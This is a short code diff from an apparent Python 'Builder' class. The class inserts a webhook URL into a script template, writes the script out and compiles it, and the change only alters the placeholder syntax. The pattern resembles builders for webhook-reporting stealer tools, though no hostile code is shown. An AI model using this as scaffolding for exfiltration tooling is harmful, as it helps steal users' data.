@@ -133,7 +133,7 @@ class Builder:
             code = f.read()
 
         with open(f"{filename}.py", "w", encoding="utf-8") as f:
-            f.write(code.replace('&webhook_here&', webhook))
+            f.write(code.replace('%webhook_here%', webhook))
         
         self.compile(filename)
             
